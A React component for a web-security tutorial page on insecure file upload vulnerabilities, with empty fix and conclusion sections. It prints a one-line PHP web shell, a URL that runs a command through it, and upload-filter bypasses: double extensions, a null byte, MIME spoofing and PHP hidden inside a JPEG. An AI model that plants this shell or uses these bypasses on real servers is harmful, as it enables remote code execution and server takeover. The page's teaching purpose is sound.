
import "./article.css"
import ScrollToTop from "../scrollToTop/scrollToTop";
import CodeBlock from "./CodeBlock";
import Header from "./shared/header"
import Auther from "./shared/auther"
import Aside from "./shared/aside"
import ArticlePart from "./shared/articlePart"
import Footer from "./shared/footer"


export default function XSS() {
  return (
    <>
      <ScrollToTop/> {/* Scroll To Top Button */}
      <Header articleName="Insecure File Upload" LabName="Insecure File Upload Labs"/>
      <Auther autherName="Waleed Sameer" readTime="5" imageSrc="/imgs/hacker.png"><span>Insecure</span> <span>File</span> <span>Upload</span></Auther>
      <Aside/>
      <ArticleContent/>
    </>
  )
}

function ArticleContent() {
  return (
      <>
        <article>
          <ArticlePart className="bug-definition">
            <h4>1. What's The Insecure File Upload Vulnerability?</h4>
            <div>
              <p>File Upload Vulnerability occurs when an application allows users to upload files <b>without properly validating or restricting the file type, size, or content.</b>
                <br />
                <br />
                This can let hackers upload malicious scripts like <span className="highlighted">.php</span>, <span className="highlighted">.jsp</span>  to the server and run them.
                <br />
                <br />
                # Imagine You give a box to a security guard and say it's a teddy bear, but inside it's a bomb. The guard doesn't check — boom! That's a file upload vulnerability.
                </p>
                <br />
                <p>
                  <b># Real-Life example:</b>
                  <br />
                  If a profile picture upload form accepts any file. An attacker uploads <span className="lighlighted">fandeta.php</span> and visits:
                  <CodeBlock language={"url"} code={`https://vuln.site/uploads/fandeta.php`} />
                </p>
            </div>
          </ArticlePart>
          <ArticlePart className="when-happens">
            <h4>2. When and Why Does Insecure File Upload Happen?</h4>
            <div>
              <ul>
                <li>
                  <b>Lack of Validation</b>
                    : Failing to check file types, sizes, or content - relying solely on client-side checks or MIME types.
                </li>
                <br />
                <li>
                  <b>Server executes uploaded files.</b>
                </li>
                <br />
                <li>
                  <b>Blacklisting Over Whitelisting</b>: Blocking "known bad" extensions e.g.(<span className="highlighted">.php, .jsp</span>) instead of allowing only safe, pre approved types e.g.(<span className="highlighted">.jpg, .png</span>).
                </li>
                <br />
                <li>
                  <b>Misplaced Trust in User Input</b>: Assuming filenames or headers like (<span className="highlighted">Content-Type</span>) cannot be spoofed.
                </li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="risks-impact">
            <h4>3. What're The Risks and Impact of Insecure File Upload?</h4>
            <div>
              <p><b># File upload vulnerability can lead to:</b></p>
              <br />
              <ul>
                <li><b>Remote Code Execution (RCE).</b></li>
                <li><b>Webshells (hacker uploads a <span className="highlighted">PHP</span> shell).</b></li>
                <li><b>Defacement (hacker uploads <span className="highlighted">HTML</span> and like login pages to steal credentials).</b></li>
                <li><b>Full server takeover if not isolated.</b></li>
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="real-exploitation">
            <h4>4. What're Real Scenarios and Exploitation Examples?</h4>
            <div>
              <b># There're many possible scenarios : </b>
              <br />
              <br />
              <ul>
                <li>Upload a PHP file like <span className="highlighted">fandeta.php</span>:
                  <CodeBlock language={"php"} code={`<?php system($_GET["command"]); ?>`}/>
                  Now The Hacker Can Access This File and Execute Commands Like : 
                  <CodeBlock language={"url"} code={`https://vuln.site/uploads/fandeta.php?command=whoami`}/>
                </li>
                <br />
                <li>
                  The Hackers Can use <b> Double Extension Trick</b> to Bypass filters by uploading:
                  <CodeBlock language={"python"} code={`evil.php.jpg     #Double Extenstion\nimage.php%00.jpg #Null byte\nimage.jpg.php    #Works In Some misconfigured systems`}/> 
                </li>
                <br />
                <li>
                  MIME Type Spoofing :
                  <CodeBlock language={"http"} code={`Content-Type: image/jpeg`}/>
                  Can Works because Many apps <b>trust the MIME without validating the actual content.</b>
                </li>
                <br />
                <li>
                  Fake Images With PHP Inside by Creating a valid <span className="highlighted">JPEG</span> that also contains PHP code.
                  <br />
                  The Valid <span className="highlighted">JPEG</span> always Starts With This Magic Number : 
                  <CodeBlock language={"hex"} code={"FF D8 FF EE"}/>
                  After Them You can Inject <span className="highlighted">PHP</span> Code!
                </li>
                <br />
              </ul>
            </div>
          </ArticlePart>
          <ArticlePart className="fix-prevent">
            <h4>5. How to Fix & Secure Your Website ?</h4>
            <div>
              
            </div>
          </ArticlePart>
          <ArticlePart className="conclusion-resources">
          <h4>- The Conclusion & Additional Resources</h4>
          </ArticlePart>
          <ArticlePart className="good-bye">
          <h4>🟡 Last but not Least!</h4>
          <div>
            <p style={{fontWeight: "bold"}}>"Think like an attacker, defend like a guardian! The best security expert is the one who never stops learning! "</p>
            <br/>
            <p style={{color: "var(--main-color)", fontFamily: 'heading-font',fontWeight: "bold"}}>
              <a href="https://facebook.com/fandeta7"
              target="_blank"
              style={{color: "var(--main-color)", textDecoration: "underline"}}>Fandeta</a> was here!</p>
          </div>
          </ArticlePart>
        </article>
        <Footer/>
      </>
  )
}

